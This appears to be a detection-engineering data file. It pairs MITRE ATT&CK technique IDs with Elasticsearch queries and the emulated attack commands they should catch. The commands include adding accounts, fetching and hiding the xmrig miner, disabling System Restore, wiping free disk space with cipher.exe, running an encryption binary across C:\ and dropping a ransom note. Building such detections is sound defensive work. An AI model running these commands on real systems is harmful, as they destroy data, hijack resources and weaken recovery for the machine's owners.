T1531,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                            {""match_phrase"":{""CommandLine"": ""net user""}},
                            {""match_phrase"":{""CommandLine"": ""net.exe user""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","net user AtomicAdministrator User2ChangePW! /add 
&& net.exe user AtomicAdministrator HuHuHUHoHo283283@dJD",2
T1496," {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""Invoke-WebRequest""}},
                {""match_phrase"": {""CommandLine"": ""Expand-Archive""}},
                {""match_phrase"": {""CommandLine"": ""Start-Process""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","Invoke-WebRequest -Uri https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-msvc-win64.zip -OutFile xmrig-6.11.2-msvc-win64.zip;
Expand-Archive -LiteralPath xmrig-6.11.2-msvc-win64.zip -DestinationPath .\;
Start-Process "".\xmrig-6.11.2\xmrig.exe"" -WindowStyle Hidden;
Start-Sleep -Seconds 60;
Stop-Process -Name ""xmrig""",2
T1531," {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""net user""}},
                {""match"": {""CommandLine"": ""add""}},
                 {""match"": {""CommandLine"": ""delete""}}, 
                 {""match_phrase"": {""CommandLine"": ""net.exe user""}},
                
          ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",net user AtomicUser User2DeletePW! /add && net.exe user AtomicUser /delete,2
T1490," {
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match_phrase"": {""CommandLine"": ""reg add""}},
                {""match"": {""CommandLine"": ""SystemRestore""}}, 
                {""wildcard"": {""CommandLine"": ""disable*""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}","reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f 
&& reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f 
&& reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableConfig"" /t ""REG_DWORD"" /d ""1"" /f 
&& reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore"" /v ""DisableSR"" /t ""REG_DWORD"" /d ""1"" /f",2
T1565.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""wildcard"":{""CommandLine"": ""copy*""}}, 
                             {""match"":{""CommandLine"": ""-duration""}},
                              {""match"":{""CommandLine"": ""-extension""}},   
                             {""match"":{""CommandLine"": ""-dir""}},                  
                            {""wildcard"":{""CommandLine"": ""*exe""}},
                             {""wildcard"":{""CommandLine"": ""*go""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",copy mission.go mission.exe &&mission.exe -duration 60 -extension .caldera -dir C:\,2
T1565.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match"":{""CommandLine"": ""mv""}}, 
                             {""match"":{""CommandLine"": ""-duration""}},
                              {""match"":{""CommandLine"": ""-extension""}},   
                             {""match"":{""CommandLine"": ""-dir""}},                  
                            {""wildcard"":{""CommandLine"": ""*.exe""}},
                             {""wildcard"":{""CommandLine"": ""*.go""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",mv mission.go mission.exe;.\mission.exe -duration 60 -extension .caldera -dir 'C:\';,2
T1491,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match_phrase"":{""CommandLine"": ""Invoke-MemeKatz.ps1""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",".\Invoke-MemeKatz.ps1
powershell.exe -ep bypass -c ""Invoke-MemeKatz.ps1""",1
T1491,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match_phrase"":{""CommandLine"": ""Set-Content""}},
                            {""match_phrase"":{""CommandLine"": ""-Value""}},
                             {""match_phrase"":{""CommandLine"": ""-Path'""}}            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",Set-Content -Path 'message.txt' -Value 'proof that this machine was hacked.',2
T1485,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                            {""match_phrase"":{""CommandLine"": ""cipher.exe""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",cipher.exe /w:C:,2
T1486,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""match"": {""CommandLine"": ""echo""}},
                {""match"": {""CommandLine"": ""Purelocker""}},
                {""match"": {""CommandLine"": ""&gt;""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""asc"" }}
}",echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt,2
